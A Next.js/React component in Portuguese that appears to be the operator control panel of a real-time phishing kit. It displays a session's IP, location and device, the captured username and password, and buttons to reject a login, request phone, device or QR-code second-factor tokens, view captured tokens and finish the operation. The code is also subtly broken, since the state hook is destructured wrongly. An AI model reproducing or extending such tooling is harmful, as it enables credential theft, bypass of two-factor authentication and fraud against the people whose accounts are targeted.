"use client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Separator } from "@/components/ui/separator";
import { useClientSessionById } from "@/hooks/useClientSessionById";
import { useOperando } from "@/hooks/useOperando";
import { useSearchParams } from "next/navigation";
import { useMemo, useState } from "react";
import { CopySection } from "../../components/CopySection";
import { StatusBadgeOperacao } from "../../components/StatusBadge";
import { OperadorProgressBar } from "./OperadorProgressBar";
import { OperandoTabela } from "./OperandoTabela";
export default function OperarClient() {
  const searchParams = useSearchParams();
  const sessionId = searchParams.get("sessionId");
  const data = useClientSessionById(sessionId, 3000);
  const operando = useOperando(sessionId || undefined);
  const [setResposta] = useState<any>(null);
  const [qrCodeUrl, setQrCodeUrl] = useState("");
  const [name, setName] = useState("");
  const [numSerie, setNumSerie] = useState("");
  const isLoading = !sessionId || data === null || data === undefined;
  const [tokenType, setTokenType] = useState<"CELULAR" | "TOKEN">("CELULAR");
  const step = data?.data?.step ?? null;
  const screen = data?.data?.screen ?? null;
  const qrUrl = data?.data?.qrCodeUrl ?? null;
  const canFinish = screen === "CARREGANDO_TELA_DE_QRCODE";
  const tabelaInfo = useMemo(() => {
    return {
      hora: data?.createdAt ?? undefined,
      cidade: data?.city ?? undefined,
      device: data?.device ?? undefined,
      estado: data?.state ?? undefined,
      screen: data?.data?.screen ?? undefined,
      qrCodeUrl: data?.data?.qrCodeUrl ?? undefined,
    };
  }, [data]);
  async function onInvalidLogin() {
    const json = await operando.invalidLogin();
    setResposta(json);
  }
  async function onRequestToken() {
    if (!name || !numSerie) {
      alert("Preencha o nome e número de série!");
      return;
    }
    const json = await operando.requestToken(name, numSerie, tokenType);
    setResposta(json);
  }

  async function onRequestQrCode() {
    if (!qrCodeUrl) {
      alert("Informe a URL do QR Code!");
      return;
    }
    const json = await operando.requestQrCode(qrCodeUrl);
    setResposta(json);
  }
  if (!sessionId) {
    return (
      <div className="p-6 max-w-[1024px]">
        <Label className="text-lg mb-2">Operando</Label>
        <p className="text-sm opacity-70">
          Nenhum <code>sessionId</code> informado na URL.
        </p>
      </div>
    );
  }
  function formatNumSerie(value: string) {
    const onlyNums = value.replace(/\D/g, "").slice(0, 4);
    return onlyNums ? `XXXXXX${onlyNums.slice(0, 3)}-${onlyNums.slice(3)}` : "";
  }
  return (
    <div className="p-6 max-w-[1024px]">
      <Label className="text-lg mb-2">
        {isLoading
          ? "Carregando sessão..."
          : `Operando ${data?.ipAddress ?? ""}`}
      </Label>
      <div className="flex justify-between">
        <StatusBadgeOperacao status={data?.data?.status || "AGUARDANDO"} />
        <div className="flex gap-3">
          <Button
            onClick={() => operando.restartUser().then(setResposta)}
            className="yellowVar"
          >
            Reiniciar usuário
          </Button>
          <Button
            onClick={() => operando.doneOperation().then(setResposta)}
            disabled={!canFinish}
            className="greenVar"
          >
            Finalizar
          </Button>
        </div>
      </div>
      <Separator className="my-4" />
      <OperandoTabela
        hora={tabelaInfo.hora}
        cidade={tabelaInfo.cidade}
        device={tabelaInfo.device}
        estado={tabelaInfo.estado}
      />
      <div className="py-3">
        <div className="bg-secondary p-2 rounded-lg border">
          <Label>Tela</Label>
          <p className="py-1">{tabelaInfo.screen}</p>
        </div>
      </div>
      {/* Dados Login */}
      <div className="flex gap-4 h-fit">
        <OperadorProgressBar active={step === 1} />
        <div className="bg-secondary/50 w-full p-4 rounded-2xl border mb-3">
          <Label className="text-lg font-medium mb-2">Dados Login</Label>
          <div className="flex items-end gap-4">
            <CopySection
              label="Usuário"
              content={data?.clientUser?.usuario ?? undefined}
            />
            <CopySection
              label="Senha"
              content={data?.clientUser?.senha ?? undefined}
            />
            <Button
              className="h-[40px] redVar"
              onClick={onInvalidLogin}
              disabled={!data?.clientUser?.usuario || !data?.clientUser?.senha}
            >
              Login Inválido
            </Button>
          </div>
        </div>
      </div>
      {/* Dados Token 1 */}
      <div className="flex gap-4 h-fit">
        <OperadorProgressBar active={step === 2} />
        <div className="bg-secondary/50 w-full p-4 rounded-2xl border mb-3">
          <div className="flex mb-3 gap-8 items-center">
            <Label className="text-lg font-medium mb-2">Token 1</Label>
            <RadioGroup
              className="flex items-center"
              value={tokenType}
              onValueChange={(value) =>
                setTokenType(value as "CELULAR" | "TOKEN")
              }
            >
              <div className="flex items-center gap-3">
                <RadioGroupItem value="CELULAR" id="r1" />
                <Label htmlFor="r1">Token Celular</Label>
              </div>
              <div className="flex items-center gap-3">
                <RadioGroupItem value="TOKEN" id="r2" />
                <Label htmlFor="r2">Token Dispositivo</Label>
              </div>
            </RadioGroup>
          </div>
          <div className="flex items-end gap-4">
            <div>
              <Label className="mb-4">Nome</Label>
              <Input
                className="h-[40px]"
                value={name}
                onChange={(e) => setName(e.target.value)}
              />
            </div>
            <div>
              <Label className="mb-4">Nº série dispositivo</Label>
              <div>
                <Input
                  className="h-[40px]"
                  value={numSerie}
                  onChange={(e) => setNumSerie(formatNumSerie(e.target.value))}
                  placeholder="000-0"
                />
              </div>
            </div>
            <Button
              className="h-[40px] blueVar"
              onClick={onRequestToken}
              disabled={!name || !numSerie}
            >
              Solicitar Token
            </Button>
            <CopySection
              label="Token"
              content={data?.clientUser?.token1 ?? undefined}
            />
            <Button
              onClick={() => operando.invalidToken().then(setResposta)}
              className="h-[40px] redVar"
              disabled={!data?.clientUser?.token1}
            >
              Token Inválido
            </Button>
          </div>
        </div>
      </div>
      {/* Dados Token QR */}
      <div className="flex gap-4 h-fit">
        <OperadorProgressBar active={step === 3} />
        <div className="bg-secondary/50 w-full p-4 rounded-2xl border mb-3">
          <Label className="text-lg font-medium mb-2">Token QrCode</Label>
          <div className="flex items-end gap-4">
            <div>
              <Label className="mb-4">URL QR Code</Label>
              <Input
                className="h-[40px]"
                value={qrCodeUrl}
                onChange={(e) => setQrCodeUrl(e.target.value)}
                placeholder="link qr code"
              />
            </div>
            <Button
              className="h-[40px] blueVar"
              onClick={onRequestQrCode}
              disabled={!qrCodeUrl}
            >
              Solicitar QrCode
            </Button>
            <Button
              disabled={!qrUrl}
              className="h-[40px] "
              onClick={onRequestQrCode}
            >
              Atualizar QrCode
            </Button>
            <CopySection
              label="Token QrCode"
              content={data?.clientUser?.tokenqr ?? undefined}
            />
            <Button
              onClick={() => operando.invalidQrCode().then(setResposta)}
              className="h-[40px] redVar"
              disabled={!data?.clientUser?.token1}
            >
              Token Inválido
            </Button>
          </div>
          <div className="pt-4 px-4">
            <div className="h-[150px] rounded-xl w-[150px] bg-background">
              <div className="p-2">
                <img className=" bg-white" src={qrUrl} alt="" />
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
